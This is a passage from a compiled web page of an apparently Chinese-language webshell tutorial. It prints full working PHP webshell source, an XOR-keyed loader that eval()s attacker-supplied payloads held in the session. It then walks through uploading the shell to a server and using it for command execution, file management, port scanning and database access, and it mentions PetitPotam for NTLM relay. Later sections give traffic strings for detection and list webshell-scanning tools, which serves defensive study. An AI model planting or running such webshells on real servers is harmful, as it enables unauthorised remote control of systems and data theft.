    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;getBasicsInfo&quot;</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;getBasicsInfo&quot;</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>PHP_XOR_RAW</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">&#39;payload&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">&#39;3c6e0b8a9c15224a&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$data</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;php://input&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;getBasicsInfo&quot;</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">encode</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;getBasicsInfo&quot;</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>生成jsp/jspx的webshell：（代码太长就不再列举）</p><figure><img src="`+R+'" alt="image-20230815144327087" tabindex="0" loading="lazy"><figcaption>image-20230815144327087</figcaption></figure><p>将文件上传到web服务器后，点击目标--添加</p><figure><img src="'+H+'" alt="image-20230815145351133" tabindex="0" loading="lazy"><figcaption>image-20230815145351133</figcaption></figure><figure><img src="'+G+'" alt="image-20230815153411326" tabindex="0" loading="lazy"><figcaption>image-20230815153411326</figcaption></figure><p>若需要配置代理，需要在这里直接配置，比蚁剑的好处就是可以为不同的webshell配置不同代理</p><figure><img src="'+L+'" alt="image-20230815153435464" tabindex="0" loading="lazy"><figcaption>image-20230815153435464</figcaption></figure><p>测试一下连接，成功后即可点击添加</p><figure><img src="'+J+'" alt="image-20230815153523504" tabindex="0" loading="lazy"><figcaption>image-20230815153523504</figcaption></figure><p>然后选中添加好的shell，右键-进入</p><figure><img src="'+U+'" alt="image-20230815153706351" tabindex="0" loading="lazy"><figcaption>image-20230815153706351</figcaption></figure><figure><img src="'+K+'" alt="image-20230815153759373" tabindex="0" loading="lazy"><figcaption>image-20230815153759373</figcaption></figure><p>命令执行：</p><figure><img src="'+M+'" alt="image-20230815153839913" tabindex="0" loading="lazy"><figcaption>image-20230815153839913</figcaption></figure><p>文件管理（刚进入是空白，需要点刷新）</p><figure><img src="'+V+'" alt="image-20230815153925634" tabindex="0" loading="lazy"><figcaption>image-20230815153925634</figcaption></figure><figure><img src="'+X+'" alt="image-20230815142532681" tabindex="0" loading="lazy"><figcaption>image-20230815142532681</figcaption></figure><p>端口扫描</p><figure><img src="'+Q+'" alt="image-20230815155547928" tabindex="0" loading="lazy"><figcaption>image-20230815155547928</figcaption></figure><p>数据库</p><figure><img src="'+Y+'" alt="image-20230816103328924" tabindex="0" loading="lazy"><figcaption>image-20230816103328924</figcaption></figure><p>zip</p><figure><img src="'+F+'" alt="image-20230816103605171" tabindex="0" loading="lazy"><figcaption>image-20230816103605171</figcaption></figure><p>Pwebshellscan</p><figure><img src="'+Z+'" alt="image-20230816103757195" tabindex="0" loading="lazy"><figcaption>image-20230816103757195</figcaption></figure><p>superTerminal</p><figure><img src="'+aa+'" alt="image-20230816103939266" tabindex="0" loading="lazy"><figcaption>image-20230816103939266</figcaption></figure><p>PetitPotam 工具可用于对远程系统的目标计算机强制进行身份验证，通常目的在于执行 NTLM 中继攻击。如果 PetitPotam 将目标锁定为域控制器，攻击者可以向中继域控制器身份验证的另一台网络机器进行身份验证。https://github.com/topotam/PetitPotam</p><h4 id="流量-2" tabindex="-1"><a class="header-anchor" href="#流量-2" aria-hidden="true">#</a> 流量</h4><p>PHP_EVAL_XOR_BASE64</p><figure><img src="'+na+'" alt="image-20230815152114365" tabindex="0" loading="lazy"><figcaption>image-20230815152114365</figcaption></figure><p>PHP_XOR_BASE64</p><figure><img src="'+sa+`" alt="image-20230815152813461" tabindex="0" loading="lazy"><figcaption>image-20230815152813461</figcaption></figure><p>固定字符串如下，可检测</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>fL1tMGI4YTlj  79NDQm7r9PZzBiOA==
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>JAVA_AES_BASE64 jsp流量</p><figure><img src="`+ea+'" alt="image-20230816121318426" tabindex="0" loading="lazy"><figcaption>image-20230816121318426</figcaption></figure><h3 id="_4-c刀-cknife" tabindex="-1"><a class="header-anchor" href="#_4-c刀-cknife" aria-hidden="true">#</a> 4. C刀(Cknife)</h3><p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。</p><p>github项目地址：https://github.com/Chora10/Cknife</p><figure><img src="'+ta+'" alt="image-20230612162825691" tabindex="0" loading="lazy"><figcaption>image-20230612162825691</figcaption></figure><h2 id="webshell查杀工具" tabindex="-1"><a class="header-anchor" href="#webshell查杀工具" aria-hidden="true">#</a> WebShell查杀工具</h2><p>当网站服务器被入侵时，我们需要一款WebShell检测工具，来帮助我们发现WebShell，进一步排查系统可能存在的安全漏洞。</p><h3 id="_1-d盾-web查杀" tabindex="-1"><a class="header-anchor" href="#_1-d盾-web查杀" aria-hidden="true">#</a> 1. D盾_Web查杀</h3><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。</p><p>兼容性：只提供Windows版本。</p><p>工具下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip</p><figure><img src="'+pa+'" alt="image-20230530171344861" tabindex="0" loading="lazy"><figcaption>image-20230530171344861</figcaption></figure><h3 id="_2-河马" tabindex="-1"><a class="header-anchor" href="#_2-河马" aria-hidden="true">#</a> 2. 河马</h3><p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持Windows、linux，支持在线查杀。</p><p>在线查杀网站：https://n.shellpub.com/</p><p>官方网站：https://www.shellpub.com/</p><figure><img src="'+ia+'" alt="image-20230530175337954" tabindex="0" loading="lazy"><figcaption>image-20230530175337954</figcaption></figure><p>有点慢</p><h3 id="_3-百度webdir" tabindex="-1"><a class="header-anchor" href="#_3-百度webdir" aria-hidden="true">#</a> 3. 百度WEBDIR+</h3><p>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放API支持批量检测。</p><p>在线查杀地址：https://scanner.baidu.com/</p><figure><img src="'+oa+'" alt="image-20230530171838366" tabindex="0" loading="lazy"><figcaption>image-20230530171838366</figcaption></figure><h3 id="_4-web-shell-detector" tabindex="-1"><a class="header-anchor" href="#_4-web-shell-detector" aria-hidden="true">#</a> 4. Web Shell Detector</h3><p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。</p><p>兼容性：提供php/python脚本，可跨平台，在线检测。</p><p>官方网站：http://www.shelldetector.com/</p><p>github项目地址：https://github.com/emposha/PHP-Shell-Detector</p><figure><img src="'+la+'" alt="image-20230530174748026" tabindex="0" loading="lazy"><figcaption>image-20230530174748026</figcaption></figure><h3 id="_5-cloudwalker-牧云" tabindex="-1"><a class="header-anchor" href="#_5-cloudwalker-牧云" aria-hidden="true">#</a> 5. CloudWalker（牧云）</h3><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性，提供linux版本，Windows 暂不支持。</p><p>在线查杀demo：https://webshellchop.chaitin.cn/</p><p>github项目地址：https://github.com/chaitin/cloudwalker</p><figure><img src="'+ca+'" alt="image-20230530181115185" tabindex="0" loading="lazy"><figcaption>image-20230530181115185</figcaption></figure><h3 id="_6-sangfor-webshellkill" tabindex="-1"><a class="header-anchor" href="#_6-sangfor-webshellkill" aria-hidden="true">#</a> 6. Sangfor WebShellKill</h3>',212),da=[ra];function ga(ka,ma){return n(),s("div",null,da)}const fa=a(ua,[["render",ga],["__file","WebShell.html.vue"]]);export{fa as default};
